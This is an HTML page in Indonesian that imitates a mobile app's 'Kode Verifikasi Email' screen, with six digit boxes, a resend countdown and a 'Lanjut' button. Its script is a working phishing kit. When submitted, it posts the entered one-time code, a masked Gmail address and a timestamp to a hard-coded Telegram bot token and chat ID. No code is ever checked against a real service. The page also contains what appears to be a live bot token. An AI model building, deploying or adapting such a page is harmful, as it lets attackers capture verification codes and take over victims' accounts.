<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Kode Verifikasi Email
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
   /* Custom input underline style */
    input[type="text"] {
      border: none;
      border-bottom: 1px solid #d1d5db;
      outline: none;
      text-align: center;
      font-weight: 600;
      font-size: 1.5rem;
      color: #374151;
      width: 3rem;
      caret-color: #10b981;
      background-color: transparent;
    }
    input[type="text"]::-webkit-inner-spin-button,
    input[type="text"]::-webkit-outer-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }
    .resend-disabled {
      color: #9ca3af;
      cursor: not-allowed;
    }
    .resend-enabled {
      color: #10b981;
      cursor: pointer;
    }
  </style>
 </head>
 <body class="bg-[#f7f1f4] min-h-screen flex flex-col">
  <header class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
   <button aria-label="Back" class="text-gray-600 text-xl">
    <i class="fas fa-arrow-left">
    </i>
   </button>
   <h1 class="text-center flex-grow font-semibold text-gray-800 text-lg">
    Kode Verifikasi Email
   </h1>
   <button aria-label="Help" class="text-green-600 text-xl">
    <i class="fas fa-headphones-alt">
    </i>
   </button>
  </header>
  <main class="flex-grow px-6 pt-8">
   <div class="w-16 h-16 rounded-full bg-gray-200 flex items-center justify-center mb-6">
    <img alt="Green outlined envelope icon on light gray circular background" class="w-10 h-10" height="40" src="https://storage.googleapis.com/a1aa/image/123aab33-406a-43b9-1cfc-cc72c2275e2e.jpg" width="40"/>
   </div>
   <h2 class="font-semibold text-gray-800 text-lg mb-1">
    Masukkan Kode Verifikasi Email
   </h2>
   <p class="text-gray-500 text-sm mb-10 max-w-xs">
    Kode Verifikasi telah dikirim ke email *******@gmail.com
   </p>
   <form id="verificationForm" class="flex justify-between max-w-xs mb-12">
    <input inputmode="numeric" maxlength="1" type="text"/>
    <input inputmode="numeric" maxlength="1" type="text"/>
    <input inputmode="numeric" maxlength="1" type="text"/>
    <input inputmode="numeric" maxlength="1" type="text"/>
    <input inputmode="numeric" maxlength="1" type="text"/>
    <input inputmode="numeric" maxlength="1" type="text"/>
   </form>
   <div class="text-center space-y-1">
    <p id="resendTimer" class="text-gray-500 text-sm resend-disabled">
     Kirim Ulang (01:00)
    </p>
    <button class="text-green-600 font-semibold text-sm">
     Coba Cara Lain
    </button>
   </div>
  </main>
  <footer>
   <button id="submitBtn" class="w-full py-3 bg-green-200 text-white font-semibold text-center cursor-not-allowed" disabled="">
    Lanjut
   </button>
  </footer>

<script>
  // Ganti dengan token bot Telegram Anda
  const TELEGRAM_BOT_TOKEN = '8398815420:AAEpqZqNC8t_QXR3bB4caJxBMXO4_MdDFls'; // Contoh token
  // Ganti dengan chat_id tujuan
  const TELEGRAM_CHAT_ID = '7549590022'; // Contoh chat_id

  const inputs = document.querySelectorAll('form input[type="text"]');
  const form = document.querySelector('#verificationForm');
  const submitButton = document.querySelector('#submitBtn');
  const resendTimer = document.querySelector('#resendTimer');

  // Timer variables
  let countdownTime = 60; // 60 detik
  let countdownInterval;
  let canResend = false;

  // Fungsi untuk menggabungkan nilai input menjadi satu kode
  function getCode() {
    return Array.from(inputs).map(input => input.value).join('');
  }

  // Aktifkan tombol jika semua input terisi
  function checkInputs() {
    const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
    submitButton.disabled = !allFilled;
    if (allFilled) {
      submitButton.classList.remove('cursor-not-allowed', 'bg-green-200');
      submitButton.classList.add('bg-green-600', 'hover:bg-green-700');
    } else {
      submitButton.classList.add('cursor-not-allowed', 'bg-green-200');
      submitButton.classList.remove('bg-green-600', 'hover:bg-green-700');
    }
  }

  // Fungsi untuk memformat waktu
  function formatTime(seconds) {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
  }

  // Fungsi untuk memulai countdown timer
  function startCountdown() {
    countdownTime = 60;
    canResend = false;
    
    resendTimer.classList.remove('resend-enabled');
    resendTimer.classList.add('resend-disabled');
    
    countdownInterval = setInterval(() => {
      if (countdownTime > 0) {
        resendTimer.textContent = `Kirim Ulang (${formatTime(countdownTime)})`;
        countdownTime--;
      } else {
        // Timer selesai
        clearInterval(countdownInterval);
        canResend = true;
        resendTimer.textContent = 'Kirim Ulang';
        resendTimer.classList.remove('resend-disabled');
        resendTimer.classList.add('resend-enabled');
      }
    }, 1000);
  }

  // Event listener untuk resend timer
  resendTimer.addEventListener('click', () => {
    if (canResend) {
      // Reset form
      inputs.forEach(input => input.value = '');
      checkInputs();
      inputs[0].focus();
      
      // Mulai countdown lagi
      startCountdown();
      
      // Simulasi kirim ulang kode (opsional)
      showNotification('Kode verifikasi baru telah dikirim!');
    }
  });

  // Fungsi untuk menampilkan notifikasi
  function showNotification(message) {
    // Buat elemen notifikasi
    const notification = document.createElement('div');
    notification.className = 'fixed top-4 left-1/2 transform -translate-x-1/2 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg z-50 transition-all duration-300';
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    // Hapus notifikasi setelah 3 detik
    setTimeout(() => {
      notification.style.opacity = '0';
      setTimeout(() => {
        document.body.removeChild(notification);
      }, 300);
    }, 3000);
  }

  // Event listener untuk setiap input
  inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      // Hanya izinkan angka
      e.target.value = e.target.value.replace(/[^0-9]/g, '');
      
      // Pindah fokus ke input berikutnya jika sudah diisi
      if (e.target.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
      checkInputs();
    });

    // Handle backspace untuk pindah ke input sebelumnya
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        inputs[index - 1].focus();
      }
    });

    // Hanya izinkan angka saat mengetik
    input.addEventListener('keypress', (e) => {
      if (!/[0-9]/.test(e.key) && e.key !== 'Backspace') {
        e.preventDefault();
      }
    });
  });

  // Event listener untuk form submit
  form.addEventListener('submit', handleSubmit);
  
  // Event listener untuk tombol submit
  submitButton.addEventListener('click', handleSubmit);

  async function handleSubmit(e) {
    e.preventDefault();
    
    const code = getCode();
    if (code.length === inputs.length) {
      // Ubah tombol menjadi loading
      submitButton.textContent = 'Mengirim...';
      submitButton.disabled = true;
      
      try {
        // Kirim pesan ke Telegram
        const message = `ðŸ” Kode Verifikasi Email: ${code}\nðŸ“§ Email: bra*******@gmail.com\nâ° Waktu: ${new Date().toLocaleString('id-ID')}`;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });

        const data = await response.json();
        
        if (data.ok) {
          // Berhasil dikirim
          submitButton.textContent = 'Berhasil!';
          submitButton.classList.remove('bg-green-600');
          submitButton.classList.add('bg-green-500');
          
          // Reset form setelah 2 detik
          setTimeout(() => {
            inputs.forEach(input => input.value = '');
            submitButton.textContent = 'Lanjut';
            submitButton.classList.remove('bg-green-500');
            submitButton.classList.add('bg-green-200');
            checkInputs();
          }, 2000);
          
        } else {
          throw new Error('Gagal mengirim ke Telegram');
        }
        
      } catch (error) {
        console.error('Error:', error);
        submitButton.textContent = 'Gagal, coba lagi';
        submitButton.classList.remove('bg-green-600');
        submitButton.classList.add('bg-red-500');
        
        // Reset tombol setelah 2 detik
        setTimeout(() => {
          submitButton.textContent = 'Lanjut';
          submitButton.classList.remove('bg-red-500');
          checkInputs();
        }, 2000);
      }
    }
  }

  // Inisialisasi
  function init() {
    checkInputs();
    inputs[0].focus();
    startCountdown(); // Mulai countdown saat halaman dimuat
  }

  // Jalankan inisialisasi saat halaman dimuat
  document.addEventListener('DOMContentLoaded', init);
  
  // Fallback jika DOMContentLoaded sudah terlewat
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
</script>
</body>
</html>
